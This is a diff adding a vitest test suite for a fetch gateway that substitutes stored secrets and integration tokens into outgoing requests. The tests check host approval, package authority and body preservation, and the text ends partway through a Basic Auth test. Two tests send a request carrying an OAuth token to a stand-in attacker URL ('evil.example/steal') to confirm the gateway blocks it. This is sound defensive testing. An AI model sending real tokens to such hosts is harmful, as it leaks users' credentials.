@@ -1,0 +1,1949 @@
+import { getErrorMessage } from '@kody-internal/shared/error-message.ts'
+import { expect, test, vi } from 'vitest'
+import {
+	executeGatewayFetch,
+	expandSecretPlaceholders,
+	secretResolutionHeaderName,
+} from '#mcp/fetch-gateway.ts'
+import {
+	parseHostApprovalRequiredBatchMessage,
+	parsePackageAccessRequiredMessage,
+} from '#mcp/secrets/errors.ts'
+import { buildBasicAuthSecretPlaceholder } from '#mcp/secrets/placeholders.ts'
+import * as secretService from '#mcp/secrets/service.ts'
+import * as shareGrants from '#worker/package-registry/share-grants.ts'
+import * as communityRepo from '#worker/community/repo.ts'
+import { createInMemoryUserMeterEnv } from '#worker/test-support/user-meter.ts'
+import * as packageRepo from '#worker/package-registry/repo.ts'
+import * as integrationCredentials from '#worker/integrations/credentials.ts'
+import * as integrationPackageAccess from '#worker/integrations/package-access.ts'
+import * as integrationService from '#worker/integrations/service.ts'
+import * as providerResolve from '#mcp/secrets/secret-providers/resolve.ts'
+
+const userMeter = createInMemoryUserMeterEnv()
+const env = {
+	APP_DB: {
+		prepare(query: string) {
+			const normalizedQuery = query.replace(/\s+/g, ' ').trim().toLowerCase()
+			return {
+				bind(...params: Array<unknown>) {
+					return {
+						async run() {
+							return { meta: { changes: 1 } }
+						},
+						async first() {
+							if (
+								normalizedQuery.includes('where stable_user_id') &&
+								params[0] !== 'user-123'
+							) {
+								throw new Error(
+									'Account reverse-resolution must bind the acting userId.',
+								)
+							}
+							return null
+						},
+						async all() {
+							return { results: [], meta: { changes: 0 } }
+						},
+					}
+				},
+			}
+		},
+	} as unknown as D1Database,
+	...userMeter.env,
+	COOKIE_SECRET: 'test-cookie-secret',
+	SECRET_STORE_KEY: 'test-secret-store-key-32-chars-minimum',
+} as unknown as Env
+
+const props = {
+	baseUrl: 'https://example.com',
+	userId: 'user-123',
+	email: null,
+	storageContext: null,
+}
+
+test('fetch gateway blocks or expands secret placeholders based on host approval', async () => {
+	const createRequest = () =>
+		new Request('https://example.com/api', {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json',
+				Authorization: 'Bearer {{secret:spotifyRefreshToken|scope=user}}',
+			},
+			body: JSON.stringify({
+				token: '{{secret:spotifyRefreshToken|scope=user}}',
+			}),
+		})
+
+	const blockedResolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: 'secret-value',
+			scope: 'user',
+			allowedHosts: [],
+		})
+	try {
+		await expandSecretPlaceholders({ request: createRequest(), props, env })
+		throw new Error('Expected host approval error.')
+	} catch (error) {
+		const message = getErrorMessage(error)
+		const approvals = parseHostApprovalRequiredBatchMessage(message)
+		expect(approvals).toEqual({
+			entries: [
+				expect.objectContaining({
+					secretName: 'spotifyRefreshToken',
+					host: 'example.com',
+					approvalUrl: expect.stringMatching(
+						/\/connect\/secrets\?name=spotifyRefreshToken&hosts=example\.com$/,
+					),
+				}),
+			],
+			bulkApprovalUrl: null,
+		})
+	} finally {
+		blockedResolveSpy.mockRestore()
+	}
+
+	const allowedResolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: 'secret-value',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+		})
+	try {
+		const transformed = await expandSecretPlaceholders({
+			request: createRequest(),
+			props,
+			env,
+		})
+		expect(transformed.headers.get('Authorization')).toBe('Bearer secret-value')
+		expect(await transformed.text()).toBe(
+			JSON.stringify({ token: 'secret-value' }),
+		)
+	} finally {
+		allowedResolveSpy.mockRestore()
+	}
+})
+
+test('fetch gateway expands secret placeholders in URL paths after Request serialization', async () => {
+	const telegramToken = '123456:AAHfakeTelegramToken'
+	const probeValue = '11111111-1111-4111-8111-111111111111'
+	const allowedResolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockImplementation(async ({ name }: { name: string }) => ({
+			found: true,
+			value: name === 'telegramBotToken' ? telegramToken : probeValue,
+			scope: 'user',
+			allowedHosts: ['api.telegram.org', 'api.notion.com', 'api.example.com'],
+		}))
+	try {
+		const pathOnlyRequest = new Request(
+			'https://api.telegram.org/bot{{secret:telegramBotToken|scope=user}}/getMe',
+		)
+		expect(pathOnlyRequest.url).toContain(
+			'%7B%7Bsecret:telegramBotToken|scope=user%7D%7D',
+		)
+		const pathOnlyTransformed = await expandSecretPlaceholders({
+			request: pathOnlyRequest,
+			props,
+			env,
+		})
+		expect(pathOnlyTransformed.url).toBe(
+			`https://api.telegram.org/bot${telegramToken}/getMe`,
+		)
+
+		const headerAndPathRequest = new Request(
+			'https://api.notion.com/v1/users/{{secret:kodyPathProbe|scope=user}}',
+			{
+				headers: {
+					Authorization: 'Bearer {{secret:notionToken|scope=user}}',
+				},
+			},
+		)
+		expect(headerAndPathRequest.url).toContain(
+			'%7B%7Bsecret:kodyPathProbe|scope=user%7D%7D',
+		)
+		const headerAndPathTransformed = await expandSecretPlaceholders({
+			request: headerAndPathRequest,
+			props,
+			env,
+		})
+		expect(headerAndPathTransformed.url).toBe(
+			`https://api.notion.com/v1/users/${probeValue}`,
+		)
+		expect(headerAndPathTransformed.headers.get('Authorization')).toBe(
+			`Bearer ${probeValue}`,
+		)
+
+		const queryRequest = new Request(
+			'https://api.example.com/search?key={{secret:queryToken|scope=user}}',
+		)
+		expect(queryRequest.url).toContain('{{secret:queryToken|scope=user}}')
+		const queryTransformed = await expandSecretPlaceholders({
+			request: queryRequest,
+			props,
+			env,
+		})
+		expect(queryTransformed.url).toBe(
+			`https://api.example.com/search?key=${probeValue}`,
+		)
+	} finally {
+		allowedResolveSpy.mockRestore()
+	}
+
+	const blockedResolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: telegramToken,
+			scope: 'user',
+			allowedHosts: [],
+		})
+	try {
+		await expandSecretPlaceholders({
+			request: new Request(
+				'https://api.telegram.org/bot{{secret:telegramBotToken}}/getMe',
+			),
+			props,
+			env,
+		})
+		throw new Error('Expected host approval error.')
+	} catch (error) {
+		const approvals = parseHostApprovalRequiredBatchMessage(
+			getErrorMessage(error),
+		)
+		expect(approvals).toEqual({
+			entries: [
+				expect.objectContaining({
+					secretName: 'telegramBotToken',
+					host: 'api.telegram.org',
+				}),
+			],
+			bulkApprovalUrl: null,
+		})
+	} finally {
+		blockedResolveSpy.mockRestore()
+	}
+})
+
+test('fetch gateway bulk host approval uses the secret scope, not the package runtime context', async () => {
+	const packageProps = {
+		...props,
+		storageContext: {
+			sessionId: null,
+			appId: 'pkg-1',
+			packageId: 'pkg-1',
+			storageId: 'pkg-1',
+		},
+	}
+	const packageSpy = vi
+		.spyOn(packageRepo, 'getSavedPackageById')
+		.mockResolvedValue({
+			id: 'pkg-1',
+			userId: 'user-123',
+			kodyId: 'example-package',
+			name: '@user/example-package',
+			description: '',
+			tags: [],
+			searchText: null,
+			hasApp: false,
+			hidden: false,
+			isPrivate: false,
+			sourceId: 'source-1',
+			createdAt: '2026-01-01T00:00:00.000Z',
+			updatedAt: '2026-01-01T00:00:00.000Z',
+		})
+	const forkSpy = vi
+		.spyOn(communityRepo, 'getCommunityForkByForkedPackageId')
+		.mockResolvedValue(null)
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: 'secret-value',
+			scope: 'user',
+			allowedHosts: [],
+			allowedPackages: ['pkg-1'],
+		})
+	try {
+		await expandSecretPlaceholders({
+			request: new Request('https://api.example.com/v1', {
+				headers: {
+					Authorization: 'Bearer {{secret:accessToken|scope=user}}',
+					'X-Refresh': '{{secret:refreshToken|scope=user}}',
+				},
+			}),
+			props: packageProps,
+			env,
+		})
+		throw new Error('Expected host approval error.')
+	} catch (error) {
+		const approvals = parseHostApprovalRequiredBatchMessage(
+			getErrorMessage(error),
+		)
+		expect(approvals?.bulkApprovalUrl).toBe(
+			'https://example.com/connect/secrets?names=accessToken%2CrefreshToken&hosts=api.example.com',
+		)
+		expect(approvals?.bulkApprovalUrl).not.toContain('scope=package')
+		expect(approvals?.entries[0]?.approvalUrl).not.toContain('scope=package')
+	} finally {
+		packageSpy.mockRestore()
+		forkSpy.mockRestore()
+		resolveSpy.mockRestore()
+	}
+})
+
+test('fetch gateway requires package approval before resolving user secrets', async () => {
+	const request = () =>
+		new Request('https://example.com/api', {
+			headers: {
+				Authorization: 'Bearer {{secret:userToken|scope=user}}',
+			},
+		})
+	const packageProps = {
+		...props,
+		storageContext: {
+			sessionId: null,
+			appId: 'pkg-1',
+			packageId: 'pkg-1',
+			storageId: 'pkg-1',
+		},
+	}
+	const packageSpy = vi
+		.spyOn(packageRepo, 'getSavedPackageById')
+		.mockResolvedValue({
+			id: 'pkg-1',
+			userId: 'user-123',
+			kodyId: 'example-package',
+			name: '@user/example-package',
+			description: '',
+			tags: [],
+			searchText: null,
+			hasApp: false,
+			hidden: false,
+			isPrivate: false,
+			sourceId: 'source-1',
+			createdAt: '2026-01-01T00:00:00.000Z',
+			updatedAt: '2026-01-01T00:00:00.000Z',
+		})
+	const ownerRemapSpy = vi
+		.spyOn(shareGrants, 'resolvePackageStorageOwnerUserId')
+		.mockImplementation(async (input) => input.callerUserId)
+	const forkSpy = vi
+		.spyOn(communityRepo, 'getCommunityForkByForkedPackageId')
+		.mockResolvedValue({
+			id: 'fork-1',
+			listingId: 'listing-1',
+			forkerUserId: 'user-123',
+			originCommit: 'abc123',
+			forkedPackageId: 'pkg-1',
+			forkedSourceId: 'source-1',
+			targetKodyId: 'example-package',
+			createdAt: '2026-01-01T00:00:00.000Z',
+			adoptedAt: null,
+			adoptionNote: null,
+		})
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValueOnce({
+			found: true,
+			value: 'secret-value',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+			allowedPackages: [],
+		})
+		.mockResolvedValueOnce({
+			found: true,
+			value: 'secret-value',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+			allowedPackages: ['pkg-1'],
+		})
+
+	try {
+		await expect(
+			expandSecretPlaceholders({
+				request: request(),
+				props: packageProps,
+				env,
+			}),
+		).rejects.toSatisfy((error: unknown) => {
+			const parsed = parsePackageAccessRequiredMessage(getErrorMessage(error))
+			return parsed?.packageName === 'example-package'
+		})
+		const transformed = await expandSecretPlaceholders({
+			request: request(),
+			props: packageProps,
+			env,
+		})
+		expect(transformed.headers.get('Authorization')).toBe('Bearer secret-value')
+		expect(packageSpy).toHaveBeenCalledTimes(1)
+		expect(forkSpy).toHaveBeenCalledTimes(1)
+		expect(resolveSpy).toHaveBeenCalledTimes(2)
+	} finally {
+		packageSpy.mockRestore()
+		ownerRemapSpy.mockRestore()
+		forkSpy.mockRestore()
+		resolveSpy.mockRestore()
+	}
+})
+
+test('fetch gateway authorizes {{secret}} as the stamped package, not the importing run', async () => {
+	const request = (authorityPackageId?: string) => {
+		const headers = new Headers({
+			Authorization: 'Bearer {{secret:userToken|scope=user}}',
+		})
+		if (authorityPackageId) {
+			headers.set('x-kody-secret-authority', authorityPackageId)
+		}
+		return new Request('https://example.com/api', { headers })
+	}
+	const runProps = {
+		...props,
+		storageContext: {
+			sessionId: null,
+			appId: 'pkg-b',
+			packageId: 'pkg-b',
+			storageId: 'pkg-b',
+		},
+		grantedSecretAuthorityPackageIds: ['pkg-a', 'pkg-b'],
+	}
+	const packageSpy = vi
+		.spyOn(packageRepo, 'getSavedPackageById')
+		.mockImplementation(async (_db, input) => {
+			if (input.packageId === 'pkg-a') {
+				return {
+					id: 'pkg-a',
+					userId: 'user-123',
+					kodyId: 'wake-owner',
+					name: '@user/wake-owner',
+					description: '',
+					tags: [],
+					searchText: null,
+					hasApp: false,
+					hidden: false,
+					isPrivate: false,
+					sourceId: 'source-a',
+					createdAt: '2026-01-01T00:00:00.000Z',
+					updatedAt: '2026-01-01T00:00:00.000Z',
+				}
+			}
+			return {
+				id: 'pkg-b',
+				userId: 'user-123',
+				kodyId: 'importer',
+				name: '@user/importer',
+				description: '',
+				tags: [],
+				searchText: null,
+				hasApp: false,
+				hidden: false,
+				isPrivate: false,
+				sourceId: 'source-b',
+				createdAt: '2026-01-01T00:00:00.000Z',
+				updatedAt: '2026-01-01T00:00:00.000Z',
+			}
+		})
+	const forkSpy = vi
+		.spyOn(communityRepo, 'getCommunityForkByForkedPackageId')
+		.mockImplementation(async (_db, input) => ({
+			id: 'fork-1',
+			listingId: 'listing-1',
+			forkerUserId: 'user-123',
+			originCommit: 'abc123',
+			forkedPackageId: input.forkedPackageId,
+			forkedSourceId: 'source-1',
+			targetKodyId:
+				input.forkedPackageId === 'pkg-a' ? 'wake-owner' : 'importer',
+			createdAt: '2026-01-01T00:00:00.000Z',
+			adoptedAt: null,
+			adoptionNote: null,
+		}))
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: 'secret-value',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+			allowedPackages: ['pkg-a'],
+		})
+
+	try {
+		await expect(
+			expandSecretPlaceholders({
+				request: request(),
+				props: runProps,
+				env,
+			}),
+		).rejects.toSatisfy((error: unknown) => {
+			const parsed = parsePackageAccessRequiredMessage(getErrorMessage(error))
+			return parsed?.packageName === 'importer'
+		})
+		const stamped = await expandSecretPlaceholders({
+			request: request('pkg-a'),
+			props: runProps,
+			env,
+		})
+		expect(stamped.headers.get('Authorization')).toBe('Bearer secret-value')
+		expect(stamped.headers.get('x-kody-secret-authority')).toBeNull()
+		await expect(
+			expandSecretPlaceholders({
+				request: request('pkg-unrelated'),
+				props: runProps,
+				env,
+			}),
+		).rejects.toSatisfy((error: unknown) => {
+			const parsed = parsePackageAccessRequiredMessage(getErrorMessage(error))
+			return parsed?.packageName === 'importer'
+		})
+		// Empty provenance is an installed empty grant set, not "no set":
+		// a forged stamp must not authorize as that package.
+		await expect(
+			expandSecretPlaceholders({
+				request: request('pkg-a'),
+				props: {
+					...runProps,
+					grantedSecretAuthorityPackageIds: [],
+				},
+				env,
+			}),
+		).rejects.toSatisfy((error: unknown) => {
+			const parsed = parsePackageAccessRequiredMessage(getErrorMessage(error))
+			return parsed?.packageName === 'importer'
+		})
+		// An omitted grant set is also fail-closed at the untrusted header
+		// boundary: a forged pkg-a header must not select that authority.
+		await expect(
+			expandSecretPlaceholders({
+				request: request('pkg-a'),
+				props: {
+					...runProps,
+					grantedSecretAuthorityPackageIds: undefined,
+				},
+				env,
+			}),
+		).rejects.toSatisfy((error: unknown) => {
+			const parsed = parsePackageAccessRequiredMessage(getErrorMessage(error))
+			return parsed?.packageName === 'importer'
+		})
+	} finally {
+		packageSpy.mockRestore()
+		forkSpy.mockRestore()
+		resolveSpy.mockRestore()
+	}
+})
+
+test('fetch gateway gates integration-owned token names by the connection grant, not secret allowed_packages', async () => {
+	const request = () =>
+		new Request('https://example.com/api', {
+			headers: {
+				Authorization: 'Bearer {{integration-token:google}}',
+			},
+		})
+	const packageProps = {
+		...props,
+		storageContext: {
+			sessionId: null,
+			appId: 'pkg-1',
+			packageId: 'pkg-1',
+			storageId: 'pkg-1',
+		},
+	}
+	const packageSpy = vi
+		.spyOn(packageRepo, 'getSavedPackageById')
+		.mockResolvedValue({
+			id: 'pkg-1',
+			userId: 'user-123',
+			kodyId: 'example-package',
+			name: '@user/example-package',
+			description: '',
+			tags: [],
+			searchText: null,
+			hasApp: false,
+			hidden: false,
+			isPrivate: false,
+			sourceId: 'source-1',
+			createdAt: '2026-01-01T00:00:00.000Z',
+			updatedAt: '2026-01-01T00:00:00.000Z',
+		})
+	const forkSpy = vi
+		.spyOn(communityRepo, 'getCommunityForkByForkedPackageId')
+		.mockResolvedValue({
+			id: 'fork-1',
+			listingId: 'listing-1',
+			forkerUserId: 'user-123',
+			originCommit: 'abc123',
+			forkedPackageId: 'pkg-1',
+			forkedSourceId: 'source-1',
+			targetKodyId: 'example-package',
+			createdAt: '2026-01-01T00:00:00.000Z',
+			adoptedAt: null,
+			adoptionNote: null,
+		})
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: 'oauth-access',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+			allowedPackages: [],
+		})
+	const tokenSpy = vi
+		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
+		.mockResolvedValue('oauth-access')
+	const grantSpy = vi
+		.spyOn(integrationPackageAccess, 'assertCanUseIntegration')
+		.mockResolvedValue(undefined)
+	const joinedSpy = vi
+		.spyOn(integrationService, 'getJoinedIntegration')
+		.mockResolvedValue({
+			lane: 'user',
+			app: {
+				apiBaseUrl: 'https://example.com',
+			},
+			connection: {
+				requiredHosts: ['example.com'],
+			},
+		} as never)
+
+	try {
+		const transformed = await expandSecretPlaceholders({
+			request: request(),
+			props: packageProps,
+			env,
+		})
+		expect(transformed.headers.get('Authorization')).toBe('Bearer oauth-access')
+		expect(grantSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				name: 'google',
+				packageId: 'pkg-1',
+			}),
+		)
+		expect(tokenSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				userId: 'user-123',
+				name: 'google',
+			}),
+		)
+		expect(resolveSpy).not.toHaveBeenCalled()
+		expect(packageSpy).not.toHaveBeenCalled()
+		expect(forkSpy).not.toHaveBeenCalled()
+	} finally {
+		packageSpy.mockRestore()
+		forkSpy.mockRestore()
+		resolveSpy.mockRestore()
+		tokenSpy.mockRestore()
+		grantSpy.mockRestore()
+		joinedSpy.mockRestore()
+	}
+})
+
+test('fetch gateway refuses integration tokens for a host outside requiredHosts', async () => {
+	const grantSpy = vi
+		.spyOn(integrationPackageAccess, 'assertCanUseIntegration')
+		.mockResolvedValue(undefined)
+	const tokenSpy = vi
+		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
+		.mockResolvedValue('oauth-access')
+	const joinedSpy = vi
+		.spyOn(integrationService, 'getJoinedIntegration')
+		.mockResolvedValue({
+			lane: 'user',
+			app: {
+				apiBaseUrl: 'https://www.googleapis.com',
+			},
+			connection: {
+				requiredHosts: ['www.googleapis.com', 'oauth2.googleapis.com'],
+			},
+		} as never)
+
+	try {
+		await expect(
+			expandSecretPlaceholders({
+				request: new Request('https://evil.example/steal', {
+					headers: {
+						Authorization: 'Bearer {{integration-token:google}}',
+					},
+				}),
+				props,
+				env,
+			}),
+		).rejects.toThrow('does not allow requests to host "evil.example"')
+		expect(tokenSpy).toHaveBeenCalled()
+		expect(joinedSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				userId: 'user-123',
+				name: 'google',
+			}),
+		)
+	} finally {
+		grantSpy.mockRestore()
+		tokenSpy.mockRestore()
+		joinedSpy.mockRestore()
+	}
+})
+
+test('fetch gateway refuses a resolved integration token when the joined connection is missing', async () => {
+	const grantSpy = vi
+		.spyOn(integrationPackageAccess, 'assertCanUseIntegration')
+		.mockResolvedValue(undefined)
+	const tokenSpy = vi
+		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
+		.mockResolvedValue('oauth-access')
+	const joinedSpy = vi
+		.spyOn(integrationService, 'getJoinedIntegration')
+		.mockResolvedValue(null)
+
+	try {
+		await expect(
+			expandSecretPlaceholders({
+				request: new Request('https://evil.example/steal', {
+					headers: {
+						Authorization: 'Bearer {{integration-token:google}}',
+					},
+				}),
+				props,
+				env,
+			}),
+		).rejects.toThrow('does not have a stored access token')
+		expect(tokenSpy).toHaveBeenCalled()
+		expect(joinedSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				userId: 'user-123',
+				name: 'google',
+			}),
+		)
+	} finally {
+		grantSpy.mockRestore()
+		tokenSpy.mockRestore()
+		joinedSpy.mockRestore()
+	}
+})
+
+test('opt-out header controls secret resolution and strips itself from forwarded requests', async () => {
+	const resolveSpy = vi.spyOn(secretService, 'resolveSecret')
+
+	const offRequest = new Request(
+		'https://discord.com/api/channels/1/messages',
+		{
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json',
+				[secretResolutionHeaderName]: 'off',
+			},
+			body: JSON.stringify({
+				content: 'Use {{secret:name}} in your fetch call.',
+			}),
+		},
+	)
+	try {
+		const offTransformed = await expandSecretPlaceholders({
+			request: offRequest,
+			props,
+			env,
+		})
+		expect(offTransformed.headers.get(secretResolutionHeaderName)).toBeNull()
+		expect(await offTransformed.text()).toBe(
+			JSON.stringify({ content: 'Use {{secret:name}} in your fetch call.' }),
+		)
+		expect(offTransformed.url).toBe(
+			'https://discord.com/api/channels/1/messages',
+		)
+		expect(resolveSpy).not.toHaveBeenCalled()
+
+		resolveSpy.mockResolvedValue({
+			found: true,
+			value: 'secret-value',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+		})
+		const onRequest = new Request('https://example.com/api', {
+			method: 'POST',
+			headers: {
+				Authorization: 'Bearer {{secret:spotifyRefreshToken|scope=user}}',
+				[secretResolutionHeaderName]: 'on',
+			},
+			body: '{}',
+		})
+		const onTransformed = await expandSecretPlaceholders({
+			request: onRequest,
+			props,
+			env,
+		})
+		expect(onTransformed.headers.get('Authorization')).toBe(
+			'Bearer secret-value',
+		)
+		expect(onTransformed.headers.get(secretResolutionHeaderName)).toBeNull()
+
+		const invalidRequest = new Request('https://example.com/api', {
+			headers: { [secretResolutionHeaderName]: 'of' },
+		})
+		await expect(
+			expandSecretPlaceholders({ request: invalidRequest, props, env }),
+		).rejects.toThrow(`Invalid ${secretResolutionHeaderName} header value "of"`)
+	} finally {
+		resolveSpy.mockRestore()
+	}
+})
+
+test('fetch gateway preserves request bodies and honors opt-out for text and binary payloads', async () => {
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: 'secret-value',
+			scope: 'user',
+			allowedHosts: ['discord.com', 'example.com'],
+		})
+	try {
+		const binaryBytes = new Uint8Array([
+			0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0xfe, 0x00, 0x01,
+		])
+		const boundary = '----TestBoundary123'
+		const encoder = new TextEncoder()
+		const prefix = encoder.encode(
+			`--${boundary}\r\nContent-Disposition: form-data; name="files[0]"; filename="image.png"\r\nContent-Type: image/png\r\n\r\n`,
+		)
+		const suffix = encoder.encode(`\r\n--${boundary}--\r\n`)
+		const multipartBody = new Uint8Array(
+			prefix.length + binaryBytes.length + suffix.length,
+		)
+		multipartBody.set(prefix, 0)
+		multipartBody.set(binaryBytes, prefix.length)
+		multipartBody.set(suffix, prefix.length + binaryBytes.length)
+
+		const multipartRequest = new Request(
+			'https://discord.com/api/channels/1/messages',
+			{
+				method: 'POST',
+				headers: {
+					Authorization: 'Bot {{secret:discordBotToken|scope=user}}',
+					'Content-Type': `multipart/form-data; boundary=${boundary}`,
+				},
+				body: multipartBody,
+			},
+		)
+		const transformedMultipart = await expandSecretPlaceholders({
+			request: multipartRequest,
+			props,
+			env,
+		})
+		expect(transformedMultipart.headers.get('Authorization')).toBe(
+			'Bot secret-value',
+		)
+		expect(new Uint8Array(await transformedMultipart.arrayBuffer())).toEqual(
+			multipartBody,
+		)
+
+		const textBoundary = '----KodyDiscordBoundaryTest'
+		const payloadJson = JSON.stringify({
+			content: 'Feedback mentioned {{secret:BraveSearch}} in the docs.',
+		})
+		const textFile = [
+			'SUMMARY',
+			'secret placeholder example',
+			'',
+			'DETAILS',
+			'Use {{secret:BraveSearch}} or {{secret:kodyPathProbe|scope=user}}.',
+		].join('\n')
+		const textMultipartParts = [
+			encoder.encode(
+				`--${textBoundary}\r\nContent-Disposition: form-data; name="payload_json"\r\nContent-Type: application/json\r\n\r\n${payloadJson}\r\n`,
+			),
+			encoder.encode(
+				`--${textBoundary}\r\nContent-Disposition: form-data; name="files[0]"; filename="feedback.txt"\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n${textFile}\r\n`,
+			),
+			encoder.encode(`--${textBoundary}--\r\n`),
+		]
+		const textMultipartBody = new Uint8Array(
+			textMultipartParts.reduce((sum, part) => sum + part.length, 0),
+		)
+		let textMultipartOffset = 0
+		for (const part of textMultipartParts) {
+			textMultipartBody.set(part, textMultipartOffset)
+			textMultipartOffset += part.length
+		}
+		expect(() =>
+			new TextDecoder('utf-8', { fatal: true }).decode(textMultipartBody),
+		).not.toThrow()
+
+		resolveSpy.mockClear()
+		resolveSpy.mockImplementation(async ({ name }) => ({
+			found: name === 'discordBotToken',
+			value: name === 'discordBotToken' ? 'secret-value' : null,
+			scope: name === 'discordBotToken' ? 'user' : null,
+			allowedHosts: name === 'discordBotToken' ? ['discord.com'] : [],
+		}))
+		const textMultipartRequest = new Request(
+			'https://discord.com/api/channels/1/messages',
+			{
+				method: 'POST',
+				headers: {
+					Authorization: 'Bot {{secret:discordBotToken|scope=user}}',
+					'Content-Type': `multipart/form-data; boundary=${textBoundary}`,
+				},
+				body: textMultipartBody,
+			},
+		)
+		const transformedTextMultipart = await expandSecretPlaceholders({
+			request: textMultipartRequest,
+			props,
+			env,
+		})
+		expect(transformedTextMultipart.headers.get('Authorization')).toBe(
+			'Bot secret-value',
+		)
+		expect(
+			new Uint8Array(await transformedTextMultipart.arrayBuffer()),
+		).toEqual(textMultipartBody)
+		expect(resolveSpy).toHaveBeenCalledTimes(1)
+		expect(resolveSpy).toHaveBeenCalledWith(
+			expect.objectContaining({ name: 'discordBotToken' }),
+		)
+
+		resolveSpy.mockClear()
+		resolveSpy.mockResolvedValue({
+			found: true,
+			value: 'secret-value',
+			scope: 'user',
+			allowedHosts: ['discord.com', 'example.com'],
+		})
+
+		const bomBody = new Uint8Array([
+			0xef,
+			0xbb,
+			0xbf,
+			...encoder.encode('{"note":"bom-prefixed json"}'),
+		])
+		const bomRequest = new Request('https://example.com/api', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: bomBody,
+		})
+		const transformedBom = await expandSecretPlaceholders({
+			request: bomRequest,
+			props,
+			env,
+		})
+		expect(new Uint8Array(await transformedBom.arrayBuffer())).toEqual(bomBody)
+
+		const placeholderText = encoder.encode('{{secret:name|scope=user}}')
+		const binaryPlaceholderBody = new Uint8Array(placeholderText.length + 2)
+		binaryPlaceholderBody[0] = 0xff
+		binaryPlaceholderBody.set(placeholderText, 1)
+		binaryPlaceholderBody[binaryPlaceholderBody.length - 1] = 0xfe
+		const binaryPlaceholderRequest = new Request('https://example.com/upload', {
+			method: 'PUT',
+			body: binaryPlaceholderBody,
+		})
+		const transformedBinaryPlaceholder = await expandSecretPlaceholders({
+			request: binaryPlaceholderRequest,
+			props,
+			env,
+		})
+		expect(resolveSpy).not.toHaveBeenCalled()
+		expect(
+			new Uint8Array(await transformedBinaryPlaceholder.arrayBuffer()),
+		).toEqual(binaryPlaceholderBody)
+
+		const optOutBinaryBody = new Uint8Array([
+			0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10,
+		])
+		const optOutBinaryRequest = new Request('https://example.com/upload', {
+			method: 'POST',
+			headers: { [secretResolutionHeaderName]: 'off' },
+			body: optOutBinaryBody,
+		})
+		const transformedOptOutBinary = await expandSecretPlaceholders({
+			request: optOutBinaryRequest,
+			props,
+			env,
+		})
+		expect(resolveSpy).not.toHaveBeenCalled()
+		expect(new Uint8Array(await transformedOptOutBinary.arrayBuffer())).toEqual(
+			optOutBinaryBody,
+		)
+
+		resolveSpy.mockResolvedValue({
+			found: true,
+			value: 'secret value+/&=',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+		})
+		const formBody = new URLSearchParams({
+			grant_type: 'refresh_token',
+			refresh_token: '{{secret:spotifyRefreshToken|scope=user}}',
+		}).toString()
+		const formRequest = new Request('https://example.com/api/token', {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/x-www-form-urlencoded',
+			},
+			body: formBody,
+		})
+		const transformedForm = await expandSecretPlaceholders({
+			request: formRequest,
+			props,
+			env,
+		})
+		expect(await transformedForm.text()).toBe(
+			new URLSearchParams({
+				grant_type: 'refresh_token',
+				refresh_token: 'secret value+/&=',
+			}).toString(),
+		)
+	} finally {
+		resolveSpy.mockRestore()
+	}
+})
+
+test('fetch gateway derives Basic Auth header and enforces host approval', async () => {
+	const placeholder = buildBasicAuthSecretPlaceholder({
+		usernameSecret: 'paypalClientId',
+		passwordSecret: 'paypalClientSecret',
+		scope: 'user',
+	})
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockImplementation(async ({ name }) => {
+			const values: Record<string, string> = {
+				paypalClientId: 'client-id',
+				paypalClientSecret: 'client-secret',
+			}
+			return {
+				found: name in values,
+				value: values[name] ?? null,
+				scope: name in values ? 'user' : null,
+				allowedHosts: name in values ? ['api-m.paypal.com'] : [],
+			}
+		})
+	const request = new Request('https://api-m.paypal.com/v1/oauth2/token', {
+		method: 'POST',
+		headers: {
+			Authorization: placeholder,
+			'Content-Type': 'application/x-www-form-urlencoded',
+		},
+		body: new URLSearchParams({
+			grant_type: 'client_credentials',
+		}).toString(),
+	})
+
+	try {
+		const transformed = await expandSecretPlaceholders({
+			request,
+			props,
+			env,
+		})
+
+		expect(transformed.headers.get('Authorization')).toBe(
+			`Basic ${btoa('client-id:client-secret')}`,
+		)
+		expect(await transformed.text()).toBe('grant_type=client_credentials')
+		expect(resolveSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				name: 'paypalClientId',
+				scope: 'user',
+			}),
+		)
+		expect(resolveSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				name: 'paypalClientSecret',
+				scope: 'user',
+			}),
+		)
+
+		const schemePrefixedRequest = new Request(
+			'https://api-m.paypal.com/v1/oauth2/token',
+			{
+				headers: {
+					Authorization: `basic ${placeholder}`,
+				},
+			},
+		)
